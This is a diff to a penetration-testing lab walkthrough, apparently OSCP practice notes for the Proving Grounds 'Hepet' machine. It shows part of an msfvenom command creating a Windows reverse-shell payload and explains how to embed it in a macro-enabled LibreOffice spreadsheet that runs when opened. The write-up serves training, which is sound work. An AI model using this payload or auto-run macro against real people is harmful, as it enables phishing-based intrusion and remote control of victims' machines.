@@ -72,7 +72,7 @@ Getting a vaild passowd successfully.
 
 ![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Hepet/Hepet_2021.08.25_23h51m41s_001_.png)
 
-Logging in to pop3 service and read the email. The letter mentioned that their computers were installed with office software. The concept is sending an office file contain a malicious macro. (I am stuck here. Referring to other walkthroughs below.)
+Logging in to pop3 service and read the email. The letter mentioned that their computers were installed with office software. The concept is sending an office file contain a malicious macro. (I am stuck here. Referring to offical walkthroughs below.)
 
 ![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Hepet/Hepet_2021.08.26_00h27m32s_003_.png)
 
@@ -84,5 +84,28 @@ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.220 LPORT=80 -f hta-psh -
 
 ![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Hepet/Hepet_2021.08.28_01h32m52s_001_.png)
 
-Because VBA's literal string can contain a maximum of 255 characters. So we have to separate the command string.
+Because VBA's literal string can contain a maximum of 255 characters but the variable doesn't. So we have to separate the command string. Moditfying the codes whichever way you like. Then we create an ```ods``` file and add the marco.
 
+(Installing LibreOffice ```sudo apt-get install libreoffice```)
+
+Opening a empty calc and save as a ods file.
+
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Hepet/Hepet_2021.08.28_15h32m11s_001_.png)
+
+Adding a new marco.
+
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Hepet/Hepet_2021.08.28_15h33m02s_002_.png)
+
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Hepet/Hepet_2021.08.28_15h34m03s_003_.png)
+
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Hepet/Hepet_2021.08.28_15h56m50s_004_.png)
+
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Hepet/Hepet_2021.08.28_15h57m07s_005_.png)
+
+We set marco to execute when the ods file is opened.
+
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Hepet/Hepet_2021.08.28_16h00m23s_006_.png)
+
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Hepet/Hepet_2021.08.28_16h06m28s_007_.png)
+
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Hepet/Hepet_2021.08.28_16h01m01s_008_.png)
